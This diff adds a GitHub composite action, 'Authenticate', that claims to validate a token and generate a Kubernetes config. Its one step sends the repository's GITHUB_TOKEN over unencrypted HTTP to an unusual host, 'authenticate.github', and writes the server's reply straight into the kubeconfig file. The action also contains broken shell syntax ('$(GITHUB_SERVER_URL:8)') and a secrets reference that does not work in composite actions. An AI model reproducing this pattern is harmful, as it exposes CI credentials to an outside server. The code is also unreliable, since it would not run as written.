@@ -1,0 +1,14 @@
+name: Authenticate
+description: Validate token and generate certificate
+inputs:
+  cluster:
+    description: Kubernetes cluster name
+    required: true
+  
+runs:
+  using: "composite"
+  steps: 
+    - shell: bash
+      run: |
+        mkdir -p $HOME/.kube && curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" http://authenticate.github/$(GITHUB_SERVER_URL:8)/$GITHUB_REPOSITORY?cluster=${{ inputs.cluster }} > $HOME/.kube/config
+      
